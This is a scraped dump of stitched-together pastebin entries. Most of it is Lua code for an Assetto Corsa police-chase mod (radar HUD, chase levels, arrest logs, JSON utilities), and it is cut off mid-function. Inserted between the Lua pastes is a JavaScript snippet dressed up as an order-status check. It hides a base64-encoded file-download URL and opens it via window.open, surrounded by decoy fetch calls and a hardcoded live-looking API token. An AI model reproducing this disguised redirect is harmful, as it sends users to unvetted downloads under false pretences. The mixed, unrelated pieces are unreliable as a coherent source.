	settings.fontSize = settings.policeSize * fontMultiplier

	resetStarsUI()
end

local function showStarsPursuit()
	local starsColor = rgbm(1, 1, 1, os.clock()%2 + 0.3)
	resetStarsUI()
	for i = 1, 5 do
		if i > pursuit.level/2 then
			ui.drawIcon(ui.Icons.StarEmpty, starsUI.starsPos, starsUI.starsSize, rgbm(1, 1, 1, 0.2))
		else
			ui.drawIcon(ui.Icons.StarFull, starsUI.starsPos, starsUI.starsSize, starsColor)
		end
		starsUI.starsPos.x = starsUI.starsPos.x - settings.starsSize - starsUI.startSpace
		starsUI.starsSize.x = starsUI.starsSize.x - settings.starsSize - starsUI.startSpace
	end
end

local showPreviewMsg = false
local showPreviewStars = false
COLORSMSGBG = rgbm(0.5,0.5,0.5,0.5)

local function initsettings()
	if settings.unit then
		settings.fontSize = settings.policeSize * fontMultiplier
		if settings.unit ~= ""km/h"" then settings.unitMult = 0.621371 end
		settings.policeSize = settings.policeSize * windowHeight/1440
		settings.fontSize = settings.policeSize * windowHeight/1440
		imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
		updatePos()
	end
end

local function previewMSG()
	ui.beginTransparentWindow(""previewMSG"", vec2(0, 0), vec2(windowWidth, windowHeight))
	ui.pushDWriteFont(""Orbitron;Weight=800"")
	local tSize = ui.measureDWriteText(""Messages from Police when being chased"", settings.fontSizeMSG)
	local uiOffsetX = settings.msgOffsetX - tSize.x/2
	local uiOffsetY = settings.msgOffsetY
	ui.drawRectFilled(vec2(uiOffsetX - 5, uiOffsetY-5), vec2(uiOffsetX + tSize.x + 5, uiOffsetY + tSize.y + 5), COLORSMSGBG)
	ui.dwriteDrawText(""Messages from Police when being chased"", settings.fontSizeMSG, vec2(uiOffsetX, uiOffsetY), rgbm.colors.cyan)
	ui.popDWriteFont()
	ui.endTransparentWindow()
end

local function previewStars()
	ui.beginTransparentWindow(""previewStars"", vec2(0, 0), vec2(windowWidth, windowHeight))
	showStarsPursuit()
	ui.endTransparentWindow()
end

local function uiTab()
	ui.text('On Screen Message : ')
	settings.timeMsg = ui.slider('##' .. 'Time Msg On Screen', settings.timeMsg, 1, 15, 'Time Msg On Screen' .. ': %.0fs')
	settings.fontSizeMSG = ui.slider('##' .. 'Font Size MSG', settings.fontSizeMSG, 10, 50, 'Font Size' .. ': %.0f')
	ui.text('Stars : ')
	settings.starsPos.x = ui.slider('##' .. 'Stars Offset X', settings.starsPos.x, 0, windowWidth, 'Stars Offset X' .. ': %.0f')
	settings.starsPos.y = ui.slider('##' .. 'Stars Offset Y', settings.starsPos.y, 0, windowHeight, 'Stars Offset Y' .. ': %.0f')
	settings.starsSize = ui.slider('##' .. 'Stars Size', settings.starsSize, 10, 50, 'Stars Size' .. ': %.0f')
	ui.newLine()
	ui.text('Offset : ')
	settings.msgOffsetY = ui.slider('##' .. 'Msg On Screen Offset Y', settings.msgOffsetY, 0, windowHeight, 'Msg On Screen Offset Y' .. ': %.0f')
	settings.msgOffsetX = ui.slider('##' .. 'Msg On Screen Offset X', settings.msgOffsetX, 0, windowWidth, 'Msg On Screen Offset X' .. ': %.0f')
    ui.newLine()
	ui.text('Preview : ')
	ui.sameLine()
    if ui.button('Message') then
		showPreviewMsg = not showPreviewMsg
		showPreviewStars = false
	end
	ui.sameLine()
	if ui.button('Stars') then
		showPreviewStars = not showPreviewStars
		showPreviewMsg = false
	end
    if showPreviewMsg then previewMSG()
	elseif showPreviewStars then previewStars() end
	if ui.button('Offset X to center') then settings.msgOffsetX = windowWidth/2 end
	ui.newLine()
end

local function settingsWindow()
	imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
	ui.dwriteTextAligned(""settings"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/6.5,60), false, rgbm.colors.white)
	ui.drawLine(vec2(0,60), vec2(windowWidth/6.5,60), rgbm.colors.white, 1)
	ui.newLine(20)
	ui.sameLine(10)
	ui.beginGroup()
	ui.text('Unit : ')
	ui.sameLine(160)
	if ui.selectable('mph', settings.unit == 'mph',_, ui.measureText('km/h')) then
		settings.unit = 'mph'
		settings.unitMult = 0.621371
	end
	ui.sameLine(200)
	if ui.selectable('km/h', settings.unit == 'km/h',_, ui.measureText('km/h')) then
		settings.unit = 'km/h'
		settings.unitMult = 1
	end
	ui.sameLine(windowWidth/6.5 - 120)
	if ui.button('Close', vec2(100, windowHeight/50)) then
		settingsOpen = false
		onsettingsChange()
	end
	ui.text('HUD : ')
	settings.hudOffsetX = ui.slider('##' .. 'HUD Offset X', settings.hudOffsetX, 0, windowWidth, 'HUD Offset X' .. ': %.0f')
	settings.hudOffsetY = ui.slider('##' .. 'HUD Offset Y', settings.hudOffsetY, 0, windowHeight, 'HUD Offset Y' .. ': %.0f')
	settings.policeSize = ui.slider('##' .. 'HUD Size', settings.policeSize, 10, 50, 'HUD Size' .. ': %.0f')
	settings.fontSize = settings.policeSize * fontMultiplier
    ui.setNextItemWidth(300)
    ui.newLine()
    uiTab()
	updatePos()
	ui.endGroup()
end

---------------------------------------------------------------------------------------------- Utils ----------------------------------------------------------------------------------------------

local function formatMessage(message)
	local msgToSend = message
	if pursuit.suspect == nil then
		msgToSend = string.gsub(msgToSend,""`CAR`"", ""No Car"")
		msgToSend = string.gsub(msgToSend,""`NAME`"", ""No Name"")
		msgToSend = string.gsub(msgToSend,""`SPEED`"", ""No Speed"")
		return msgToSend
	end
	msgToSend = string.gsub(msgToSend,""`CAR`"", string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """"))
	msgToSend = string.gsub(msgToSend,""`NAME`"", ""@"" .. ac.getDriverName(pursuit.suspect.index))
	msgToSend = string.gsub(msgToSend,""`SPEED`"", string.format(""%d "", ac.getCarSpeedKmh(pursuit.suspect.index) * settings.unitMult) .. settings.unit)
	return msgToSend
end

---------------------------------------------------------------------------------------------- HUD ----------------------------------------------------------------------------------------------

local policeLightsPos = {
	vec2(0,0),
	vec2(windowWidth/10,windowHeight),
	vec2(windowWidth-windowWidth/10,0),
	vec2(windowWidth,windowHeight)
}

local function showPoliceLights()
	local timing = math.floor(os.clock()*2 % 2)
	if timing == 0 then
		ui.drawRectFilledMultiColor(policeLightsPos[1], policeLightsPos[2], rgbm(1,0,0,0.5), rgbm(0,0,0,0), rgbm(0,0,0,0), rgbm(1,0,0,0.5))
		ui.drawRectFilledMultiColor(policeLightsPos[3], policeLightsPos[4], rgbm(0,0,0,0), rgbm(0,0,1,0.5), rgbm(0,0,1,0.5), rgbm(0,0,0,0))
	else
		ui.drawRectFilledMultiColor(policeLightsPos[1], policeLightsPos[2], rgbm(0,0,1,0.5), rgbm(0,0,0,0), rgbm(0,0,0,0), rgbm(0,0,1,0.5))
		ui.drawRectFilledMultiColor(policeLightsPos[3], policeLightsPos[4], rgbm(0,0,0,0), rgbm(1,0,0,0.5), rgbm(1,0,0,0.5), rgbm(0,0,0,0))
	end
end

local chaseLVL = {
	message = """",
	messageTimer = 0,
	color = rgbm(1,1,1,1),
}

local function resetChase()
	pursuit.enable = false
	pursuit.nextMessage = 30
	pursuit.lostSight = false
	pursuit.timeLostSight = 2
end

local function lostSuspect()
	resetChase()
	pursuit.lostSight = false
	pursuit.timeLostSight = 0
	pursuit.level = 1
	ac.sendChatMessage(formatMessage(msgLost.msg[math.random(#msgLost.msg)]))
	pursuit.suspect = nil
	if cspAboveP218 then
		ac.setExtraSwitch(0, false)
	end
end

local iconsColorOn = {
	[1] = rgbm(1,0,0,1),
	[2] = rgbm(1,1,1,1),
	[3] = rgbm(1,1,1,1),
	[4] = rgbm(1,1,1,1),
	[5] = rgbm(1,1,1,1),
	[6] = rgbm(1,1,1,1),
}

local playersInRange = {}

local function drawImage()
	iconsColorOn[2] = rgbm(0.99,0.99,0.99,1)
	iconsColorOn[3] = rgbm(0.99,0.99,0.99,1)
	iconsColorOn[4] = rgbm(0.99,0.99,0.99,1)
	iconsColorOn[5] = rgbm(0.99,0.99,0.99,1)
	iconsColorOn[6] = rgbm(0.99,0.99,0.99,1)
	local uiStats = ac.getUI()

	if ui.rectHovered(iconPos.arrest2, iconPos.arrest1) then
		iconsColorOn[2] = rgbm(1,0,0,1)
		if pursuit.suspect and pursuit.suspect.speedKmh < 50 and car.speedKmh < 20 and uiStats.isMouseLeftKeyClicked then
			pursuit.hasArrested = true
		end
	elseif ui.rectHovered(iconPos.cams2, iconPos.cams1) then
		iconsColorOn[3] = rgbm(1,0,0,1)
		if uiStats.isMouseLeftKeyClicked then
			if camerasOpen then camerasOpen = false
			else
				camerasOpen = true
				arrestLogsOpen = false
				if settingsOpen then
					onsettingsChange()
					settingsOpen = false
				end
			end
		end
	elseif ui.rectHovered(iconPos.lost2, iconPos.lost1) then
		iconsColorOn[4] = rgbm(1,0,0,1)
		if pursuit.suspect and uiStats.isMouseLeftKeyClicked then
			lostSuspect()
		end
	elseif ui.rectHovered(iconPos.logs2, iconPos.logs1) then
		iconsColorOn[5] = rgbm(1,0,0,1)
		if uiStats.isMouseLeftKeyClicked then
			if arrestLogsOpen then arrestLogsOpen = false
			else
				arrestLogsOpen = true
				camerasOpen = false
				if settingsOpen then
					onsettingsChange()
					settingsOpen = false
				end
			end
		end
	elseif ui.rectHovered(iconPos.menu2, iconPos.menu1) then
		iconsColorOn[6] = rgbm(1,0,0,1)
		if uiStats.isMouseLeftKeyClicked then
			if settingsOpen then
				onsettingsChange()
				settingsOpen = false
			else
				settingsOpen = true
				arrestLogsOpen = false
				camerasOpen = false
			end
		end
	end
	ui.image(hudImg.base, imageSize, rgbm.colors.white)
	ui.drawImage(hudImg.radar, vec2(0,0), imageSize, iconsColorOn[1])
	ui.drawImage(hudImg.arrest, vec2(0,0), imageSize, iconsColorOn[2])
	ui.drawImage(hudImg.cams, vec2(0,0), imageSize, iconsColorOn[3])
	ui.drawImage(hudImg.lost, vec2(0,0), imageSize, iconsColorOn[4])
	ui.drawImage(hudImg.logs, vec2(0,0), imageSize, iconsColorOn[5])
	ui.drawImage(hudImg.menu, vec2(0,0), imageSize, iconsColorOn[6])
end

local function playerSelected(player)
	if player.speedKmh > 50 then
		pursuit.suspect = player
		pursuit.nextMessage = 30
		pursuit.level = 1
		local msgToSend = ""Officer "" .. ac.getDriverName(0) .. "" is chasing you. Run! ""
		pursuit.startedTime = settings.timeMsg
		pursuit.engage = true
		acpPolice{message = msgToSend, messageType = 0, yourIndex = ac.getCar(pursuit.suspect.index).sessionID}
		if cspAboveP218 then
			ac.setExtraSwitch(0, true)
		end
	end
end

local function hudInChase()
	ui.pushDWriteFont(""Orbitron;Weight=Black"")
	ui.sameLine(20)
	ui.beginGroup()
	ui.newLine(1)
	local textPursuit = ""LVL : "" .. math.floor(pursuit.level/2)
	ui.dwriteTextWrapped(ac.getDriverName(pursuit.suspect.index) .. '\n'
						.. string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """")
						.. '\n' .. string.format(""Speed: %d "", pursuit.suspect.speedKmh * settings.unitMult) .. settings.unit
						.. '\n' .. textPursuit, settings.fontSize/2, rgbm.colors.white)
	ui.dummy(vec2(imageSize.x/5,imageSize.y/20))
	ui.newLine(30)
	ui.sameLine()
	if ui.button('Cancel Chase', vec2(imageSize.x/5, imageSize.y/20)) then
		lostSuspect()
	end
	ui.endGroup()
	ui.popDWriteFont()
end

local function drawText()
	local uiStats = ac.getUI()
	ui.pushDWriteFont(""Orbitron;Weight=Bold"")
	ui.dwriteDrawText(""RADAR ACTIVE"", settings.fontSize/2, vec2((textPos.box2.x - ui.measureDWriteText(""RADAR ACTIVE"", settings.fontSize/2).x)/2, 0), rgbm(1,0,0,1))
	ui.popDWriteFont()
	ui.pushDWriteFont(""Orbitron;Weight=Regular"")
	ui.dwriteDrawText(""NEARBY VEHICULE SPEED SCANNING"", settings.fontSize/3, vec2((textPos.box2.x - ui.measureDWriteText(""NEARBY VEHICULE SPEED SCANNING"", settings.fontSize/3).x)/2, settings.fontSize/1.5), rgbm(1,0,0,1))

	local colorText = rgbm(1,1,1,1)
	textPos.box1 = vec2(0, textSize.size.y*2.5)
	ui.dummy(vec2(textPos.box2.x,settings.fontSize))
	for i = 1, #playersInRange do
		colorText = rgbm(1,1,1,1)
		ui.drawRect(vec2(textPos.box2.x/9,textPos.box1.y), vec2(textPos.box2.x*8/9, textPos.box1.y + textPos.box2.y), rgbm(1,1,1,0.1), 1)
		if ui.rectHovered(textPos.box1, textPos.box1 + textPos.box2) then
			colorText = rgbm(1,0,0,1)
			if uiStats.isMouseLeftKeyClicked then
				playerSelected(playersInRange[i].player)
			end
		end
		ui.dwriteDrawText(playersInRange[i].text, settings.fontSize/2, vec2((textPos.box2.x - ui.measureDWriteText(ac.getDriverName(playersInRange[i].player.index) .. "" - 000 "" .. settings.unit, settings.fontSize/2).x)/2, textPos.box1.y + textSize.size.y/5), colorText)
		textPos.box1 = textPos.box1 + textPos.addBox
		ui.dummy(vec2(textPos.box2.x, i * settings.fontSize/5))
	end
	ui.popDWriteFont()
end

local function radarUI()
	ui.toolWindow('radarText', textSize.window1, textSize.window2, true, function ()
		ui.childWindow('childradar', textSize.window2, true , function ()
			if pursuit.suspect then hudInChase()
			else drawText() end
		end)
	end)
	ui.transparentWindow('radar', vec2(settings.hudOffsetX, settings.hudOffsetY), imageSize, true, function ()
		drawImage()
	end)
end

local function hidePlayers()
	local hideRange = 500
	for i = ac.getSim().carsCount - 1, 0, -1 do
		local player = ac.getCar(i)
		local playerCarID = ac.getCarID(i)
		if player.isConnected and ac.getCarBrand(i) ~= ""traffic"" then
			if playerCarID ~= valideCar[1] and playerCarID ~= valideCar[2] and playerCarID ~= valideCar[3] then
				if player.position.x > car.position.x - hideRange and player.position.z > car.position.z - hideRange and player.position.x < car.position.x + hideRange and player.position.z < car.position.z + hideRange then
					ac.hideCarLabels(i, false)
				else
					ac.hideCarLabels(i, true)
				end
			end
		end
	end
end

local function radarUpdate()
	if firstload and not pursuit.suspect then return end
	local radarRange = 250
	local previousSize = #playersInRange

	local j = 1
	for i = ac.getSim().carsCount - 1, 0, -1 do
		local player = ac.getCar(i)
		local playerCarID = ac.getCarID(i)
		if player.isConnected and ac.getCarBrand(i) ~= ""traffic"" then
			if playerCarID ~= valideCar[1] and playerCarID ~= valideCar[2] and playerCarID ~= valideCar[3] then
				if player.position.x > car.position.x - radarRange and player.position.z > car.position.z - radarRange and player.position.x < car.position.x + radarRange and player.position.z < car.position.z + radarRange then
					playersInRange[j] = {}
					playersInRange[j].player = player
					playersInRange[j].text = ac.getDriverName(player.index) .. string.format("" - %d "", player.speedKmh * settings.unitMult) .. settings.unit
					j = j + 1
					if j == 9 then break end
				end
			end
		end
	end
	for i = j, previousSize do playersInRange[i] = nil end
end

---------------------------------------------------------------------------------------------- Chase ----------------------------------------------------------------------------------------------

local function inRange()
	local distance_x = pursuit.suspect.position.x - car.position.x
	local distance_z = pursuit.suspect.position.z - car.position.z
	local distanceSquared = distance_x * distance_x + distance_z * distance_z
	if(distanceSquared < pursuit.minDistance) then
		pursuit.enable = true
		pursuit.lostSight = false
		pursuit.timeLostSight = 2
	elseif (distanceSquared < pursuit.maxDistance) then resetChase()
	else
		if not pursuit.lostSight then
			pursuit.lostSight = true
			pursuit.timeLostSight = 2
		else
			pursuit.timeLostSight = pursuit.timeLostSight - ui.deltaTime()
			if pursuit.timeLostSight < 0 then lostSuspect() end
		end
	end
end

local function sendChatToSuspect()
	if pursuit.enable then
		if 0 < pursuit.nextMessage then
			pursuit.nextMessage = pursuit.nextMessage - ui.deltaTime()
		elseif pursuit.nextMessage < 0 then
			local nb = tostring(pursuit.level)
			acpPolice{message = nb, messageType = 1, yourIndex = ac.getCar(pursuit.suspect.index).sessionID}
			if pursuit.level < 10 then
				pursuit.level = pursuit.level + 1
				chaseLVL.messageTimer = settings.timeMsg
				chaseLVL.message = ""CHASE LEVEL "" .. math.floor(pursuit.level/2)
				if pursuit.level > 8 then
					chaseLVL.color = rgbm.colors.red
				elseif pursuit.level > 6 then
					chaseLVL.color = rgbm.colors.orange
				elseif pursuit.level > 4 then
					chaseLVL.color = rgbm.colors.yellow
				else
					chaseLVL.color = rgbm.colors.white
				end
			end
			pursuit.nextMessage = 30
		end
	end
end

local function showPursuitMsg()
	local text = """"
	if chaseLVL.messageTimer > 0 then
		chaseLVL.messageTimer = chaseLVL.messageTimer - ui.deltaTime()
		text = chaseLVL.message
	end
	if pursuit.startedTime > 0 then
		if pursuit.suspect then
			text = ""You are chasing "" .. ac.getDriverName(pursuit.suspect.index) .. "" driving a "" .. string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """") .. "" ! Get him! ""
		end
		if pursuit.startedTime > 6 then showPoliceLights() end
		if pursuit.engage and pursuit.startedTime < 8 then
			ac.sendChatMessage(formatMessage(msgEngage.msg[math.random(#msgEngage.msg)]))
			pursuit.engage = false
		end
	end
	if text ~= """" then
		local textLenght = ui.measureDWriteText(text, settings.fontSizeMSG)
		local rectPos1 = vec2(settings.msgOffsetX - textLenght.x/2, settings.msgOffsetY)
		local rectPos2 = vec2(settings.msgOffsetX + textLenght.x/2, settings.msgOffsetY + settings.fontSizeMSG)
		local rectOffset = vec2(10, 10)
		if ui.time() % 1 < 0.5 then
			ui.drawRectFilled(rectPos1 - vec2(10,0), rectPos2 + rectOffset, COLORSMSGBG, 10)
		else
			ui.drawRectFilled(rectPos1 - vec2(10,0), rectPos2 + rectOffset, rgbm(0,0,0,0.5), 10)
		end
		ui.dwriteDrawText(text, settings.fontSizeMSG, rectPos1, chaseLVL.color)
	end
end

local function arrestSuspect()
	if pursuit.hasArrested and pursuit.suspect then
		local msgToSend = formatMessage(msgArrest.msg[math.random(#msgArrest.msg)])
		table.insert(arrestations, msgToSend .. os.date(""\nDate of the Arrestation: %c""))
		ac.sendChatMessage(msgToSend .. ""\nPlease Get Back Pit, GG!"")
		pursuit.id = pursuit.suspect.sessionID
		if playerData.Arrests == nil then playerData.Arrests = 0 end
		playerData.Arrests = playerData.Arrests + 1
		pursuit.startedTime = 0
		pursuit.suspect = nil
		pursuit.timerArrest = 1
	elseif pursuit.hasArrested then
		if pursuit.timerArrest > 0 then
			pursuit.timerArrest = pursuit.timerArrest - ui.deltaTime()
		else
			acpPolice{message = ""BUSTED!"", messageType = 2, yourIndex = pursuit.id}
			pursuit.timerArrest = 0
			pursuit.suspect = nil
			pursuit.id = -1
			pursuit.hasArrested = false
			pursuit.startedTime = 0
			pursuit.enable = false
			pursuit.level = 1
			pursuit.nextMessage = 20
			pursuit.lostSight = false
			pursuit.timeLostSight = 0
			local data = {
				[""Arrests""] = playerData.Arrests,
			}
			updatefirebase()
			updatefirebaseData(""Arrests"", data)
		end
	end
end

local function chaseUpdate()
	if pursuit.startedTime > 0 then pursuit.startedTime = pursuit.startedTime - ui.deltaTime()
	else pursuit.startedTime = 0 end
	if pursuit.suspect then
		sendChatToSuspect()
		inRange()
	end
	arrestSuspect()
end

---------------------------------------------------------------------------------------------- Menu ----------------------------------------------------------------------------------------------

local function arrestLogsUI()
	ui.dwriteTextAligned(""Arrestation Logs"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/4,60), false, rgbm.colors.white)
	ui.drawLine(vec2(0,60), vec2(windowWidth/4,60), rgbm.colors.white, 1)
	ui.newLine(15)
	ui.sameLine(10)
	ui.beginGroup()
	local allMsg = """"
	ui.dwriteText(""Click on the button next to the message you want to copy."", 15, rgbm.colors.white)
	ui.sameLine(windowWidth/4 - 120)
	if ui.button('Close', vec2(100, windowHeight/50)) then arrestLogsOpen = false end
	for i = 1, #arrestations do
		if ui.smallButton(""#"" .. i .. "": "", vec2(0,10)) then
			ui.setClipboardText(arrestations[i])
		end
		ui.sameLine()
		ui.dwriteTextWrapped(arrestations[i], 15, rgbm.colors.white)
	end
	if #arrestations == 0 then
		ui.dwriteText(""No arrestation logs yet."", 15, rgbm.colors.white)
	end
	ui.newLine()
	if ui.button(""Set all messages to ClipBoard"") then
		for i = 1, #arrestations do
			allMsg = allMsg .. arrestations[i] .. ""\n\n""
		end
		ui.setClipboardText(allMsg)
	end
	ui.endGroup()
end

local buttonPos = windowWidth/65

local function camerasUI()
	ui.dwriteTextAligned(""Surveillance Cameras"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/6.5,60), false, rgbm.colors.white)
	ui.drawLine(vec2(0,60), vec2(windowWidth/6.5,60), rgbm.colors.white, 1)
	ui.newLine(20)
	ui.beginGroup()
	ui.sameLine(buttonPos)
	if ui.button('Close', vec2(windowWidth/6.5 - buttonPos*2,30)) then camerasOpen = false end
	ui.newLine()
	for i = 1, #cameras do
		local h = math.rad(cameras[i].dir + ac.getCompassAngle(vec3(0, 0, 1)))
		ui.newLine()
		ui.sameLine(buttonPos)
		if ui.button(cameras[i].name, vec2(windowWidth/6.5 - buttonPos*2,30)) then
			ac.setCurrentCamera(ac.CameraMode.Free)
			ac.setCameraPosition(cameras[i].pos)
			ac.setCameraDirection(vec3(math.sin(h), 0, math.cos(h))) 
			ac.setCameraFOV(cameras[i].fov)
		end
	end
	if ac.getSim().cameraMode == ac.CameraMode.Free then
		ui.newLine()
		ui.newLine()
		ui.sameLine(buttonPos)
        if ui.button('Police car camera', vec2(windowWidth/6.5 - buttonPos*2,30)) then ac.setCurrentCamera(ac.CameraMode.Cockpit) end
    end
end


local initialized = false
local menuSize = {vec2(windowWidth/4, windowHeight/3), vec2(windowWidth/6.4, windowHeight/2.2)}
local buttonPressed = false

local function moveMenu()
	if ui.windowHovered() and ui.mouseDown() then buttonPressed = true end
	if ui.mouseReleased() then buttonPressed = false end
	if buttonPressed then settings.menuPos = settings.menuPos + ui.mouseDelta() end
end

---------------------------------------------------------------------------------------------- updates ----------------------------------------------------------------------------------------------

function script.drawUI()
	if carID ~= valideCar[1] and carID ~= valideCar[2] and carID ~= valideCar[3] or cspVersion < cspMinVersion then return end
	if initialized and settings.policeSize then
		if firstload then
			firstload = false
			initsettings()
		end
		radarUI()
		if pursuit.suspect then showStarsPursuit() end
		showPursuitMsg()
		if settingsOpen then
			ui.toolWindow('settings', settings.menuPos, menuSize[2], true, function ()
				ui.childWindow('childsettings', menuSize[2], true, function () settingsWindow() moveMenu() end)
			end)
		elseif arrestLogsOpen then
			ui.toolWindow('ArrestLogs', settings.menuPos, menuSize[1], true, function ()
				ui.childWindow('childArrestLogs', menuSize[1], true, function () arrestLogsUI() moveMenu() end)
			end)
		elseif camerasOpen then
			ui.toolWindow('Cameras', settings.menuPos, menuSize[2], true, function ()
				ui.childWindow('childCameras', menuSize[2], true, function () camerasUI() moveMenu() end)
			end)
		end
	end
end

ac.onCarJumped(0, function (carid)
	if carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3]then
		if pursuit.suspect then lostSuspect() end
	end
end)

function script.update(dt)
	if carID ~= valideCar[1] and carID ~= valideCar[2] and carID ~= valideCar[3] or cspVersion < cspMinVersion then return end
	if not initialized then
		loadsettings()
		getFirebase()
		initialized = true
	else
		radarUpdate()
		chaseUpdate()
		--hidePlayers()
	end
end

if carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3] and cspVersion >= cspMinVersion then
	ui.registerOnlineExtra(ui.Icons.Settings, ""Settings"", nil, settingsWindow, nil, ui.OnlineExtraFlags.Tool, 'ui.WindowFlags.AlwaysAutoResize')
end"
T05reLRj,Untitled,kammex,JavaScript,Thursday 3rd of April 2025 12:25:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/260/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cBYfJK6h,sss,supinus,Lua,Thursday 3rd of April 2025 12:25:03 PM CDT,"ac.log(""Police script"")

local sim = ac.getSim()
local car = ac.getCar(0)
local valideCar = {""riz_bmw_f93_m8_2023_tune"", ""audi_rs3_2022_LMC"", ""police_r34_tiresarpi""}
local carID = ac.getCarID(0)

local windowWidth = sim.windowWidth
local windowHeight = sim.windowHeight
local settingsOpen = true
local arrestLogsOpen = false
local camerasOpen = false

local cspVersion = ac.getPatchVersionCode()
local cspMinVersion = 2144
local fontMultiplier = windowHeight/1440

local firstload = true
local cspAboveP218 = cspVersion >= 2363
ac.log(""Police script"")
if not(carID == valideCar) or cspVersion < cspMinVersion then return end

local msgArrest = {
    msg = {""`NAME` has been arrested for Speeding. The individual was driving a `CAR`."",
    ""We have apprehended `NAME` for Speeding. The suspect was behind the wheel of a `CAR`."",
    ""The driver of a `CAR`, identified as `NAME`, has been arrested for Speeding."",
    ""`NAME` has been taken into custody for Illegal Racing. The suspect was driving a `CAR`."",
    ""We have successfully apprehended `NAME` for Illegal Racing. The individual was operating a `CAR`."",
    ""The driver of a `CAR`, identified as `NAME`, has been arrested for Illegal Racing."",
    ""`NAME` has been apprehended for Speeding. The suspect was operating a `CAR` at the time of the arrest."",
    ""We have successfully detained `NAME` for Illegal Racing. The individual was driving a `CAR`."",
    ""`NAME` driving a `CAR` has been arrested for Speeding"",
    ""`NAME` driving a `CAR` has been arrested for Illegal Racing.""}
}

local msgLost = {
    msg = {""We've lost sight of the suspect. The vehicle involved is described as a `CAR` driven by `NAME`."",
    ""Attention all units, we have lost visual contact with the suspect. The vehicle involved is a `CAR` driven by `NAME`."",
    ""We have temporarily lost track of the suspect. The vehicle description is a `CAR` with `NAME` as the driver."",
    ""Visual contact with the suspect has been lost. The suspect is driving a `CAR` and identified as `NAME`."",
    ""We have lost the suspect's visual trail. The vehicle in question is described as a `CAR` driven by `NAME`."",
    ""Suspect have been lost, Vehicle Description:`CAR` driven by `NAME`"",
    ""Visual contact with the suspect has been lost. The suspect is driving a `CAR` and identified as `NAME`."",
    ""We have lost the suspect's visual trail. The vehicle in question is described as a `CAR` driven by `NAME`."",}
}

local msgEngage = {
    msg = {""Control! I am engaging on a `CAR` traveling at `SPEED`"",""Pursuit in progress! I am chasing a `CAR` exceeding `SPEED`"",""Control, be advised! Pursuit is active on a `CAR` driving over `SPEED`"",""Attention! Pursuit initiated! Im following a `CAR` going above `SPEED`"",""Pursuit engaged! `CAR` driving at a high rate of speed over `SPEED`"",""Attention all units, we have a pursuit in progress! Suspect driving a `CAR` exceeding `SPEED`"",""Attention units! We have a suspect fleeing in a `CAR` at high speed, pursuing now at `SPEED`"",""Engaging on a high-speed chase! Suspect driving a `CAR` exceeding `SPEED`!"",""Attention all units! we have a pursuit in progress! Suspect driving a `CAR` exceeding `SPEED`"",""High-speed chase underway, suspect driving `CAR` over `SPEED`"",""Control, `CAR` exceeding `SPEED`, pursuit active."",""Engaging on a `CAR` exceeding `SPEED`, pursuit initiated.""}
}

------------------------------------------------------------------------- JSON Utils -------------------------------------------------------------------------

local json = {}

-- Internal functions.

local function kind_of(obj)
  if type(obj) ~= 'table' then return type(obj) end
  local i = 1
  for _ in pairs(obj) do
    if obj[i] ~= nil then i = i + 1 else return 'table' end
  end
  if i == 1 then return 'table' else return 'array' end
end

local function escape_str(s)
  local in_char  = {'\\', '""', '/', '\b', '\f', '\n', '\r', '\t'}
  local out_char = {'\\', '""', '/',  'b',  'f',  'n',  'r',  't'}
  for i, c in ipairs(in_char) do
    s = s:gsub(c, '\\' .. out_char[i])
  end
  return s
end

-- Returns pos, did_find; there are two cases:
-- 1. Delimiter found: pos = pos after leading space + delim; did_find = true.
-- 2. Delimiter not found: pos = pos after leading space;     did_find = false.
-- This throws an error if err_if_missing is true and the delim is not found.
local function skip_delim(str, pos, delim, err_if_missing)
  pos = pos + #str:match('^%s*', pos)
  if str:sub(pos, pos) ~= delim then
    if err_if_missing then
      error('Expected ' .. delim .. ' near position ' .. pos)
    end
    return pos, false
  end
  return pos + 1, true
end

-- Expects the given pos to be the first character after the opening quote.
-- Returns val, pos; the returned pos is after the closing quote character.
local function parse_str_val(str, pos, val)
  val = val or ''
  local early_end_error = 'End of input found while parsing string.'
  if pos > #str then error(early_end_error) end
  local c = str:sub(pos, pos)
  if c == '""'  then return val, pos + 1 end
  if c ~= '\\' then return parse_str_val(str, pos + 1, val .. c) end
  -- We must have a \ character.
  local esc_map = {b = '\b', f = '\f', n = '\n', r = '\r', t = '\t'}
  local nextc = str:sub(pos + 1, pos + 1)
  if not nextc then error(early_end_error) end
  return parse_str_val(str, pos + 2, val .. (esc_map[nextc] or nextc))
end

-- Returns val, pos; the returned pos is after the number's final character.
local function parse_num_val(str, pos)
  local num_str = str:match('^-?%d+%.?%d*[eE]?[+-]?%d*', pos)
  local val = tonumber(num_str)
  if not val then error('Error parsing number at position ' .. pos .. '.') end
  return val, pos + #num_str
end


-- Public values and functions.

function json.stringify(obj, as_key)
  local s = {}  -- We'll build the string as an array of strings to be concatenated.
